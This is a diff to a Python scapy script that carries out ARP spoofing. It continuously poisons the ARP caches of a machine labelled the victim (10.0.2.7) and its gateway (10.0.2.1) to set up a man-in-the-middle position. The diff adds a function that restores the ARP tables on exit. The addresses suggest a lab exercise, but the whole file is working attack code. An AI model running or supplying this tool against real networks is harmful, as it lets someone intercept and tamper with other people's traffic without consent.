@@ -22,16 +22,29 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # Create an ARP packet
     scapy.send(packet, verbose=False) # Send the packet
 
-sent_packets_count = 0 # Initialize a counter for the number of packets sent
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip) # Get the MAC address of the destination machine
+    source_mac = get_mac(source_ip) # Get the MAC address of the source machine
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac) # Create an ARP packet
+    scapy.send(packet, count=4, verbose=False) # Send the packet 4 times to restore the connection
+
+
+target_ip = "10.0.2.7"
+gateway_ip = "10.0.2.1"
+# The target machine is the victim machine
+
 
 try:
+    sent_packets_count = 0 # Initialize a counter for the number of packets sent
     while True:
-        spoof("10.0.2.7", "10.0.2.1")
-        spoof("10.0.2.1", "10.0.2.7")
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
         sent_packets_count += 2 # Increment the packet count by 2 for each iteration
         print("\r[+] Sent packets: " + str(sent_packets_count), end="")  # Print the number of packets sent
         time.sleep(2) # Wait for 2 seconds before sending the next packet
     # This script creates an ARP spoofing packet.
 except KeyboardInterrupt:
-    print("\n[+] Detected CTRL + C ... Quitting.")
-   
+    print("\n[+] Detected CTRL + C ... Resetting ARP Tables....wait.")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+    print("[+] ARP tables reset. Exiting.")
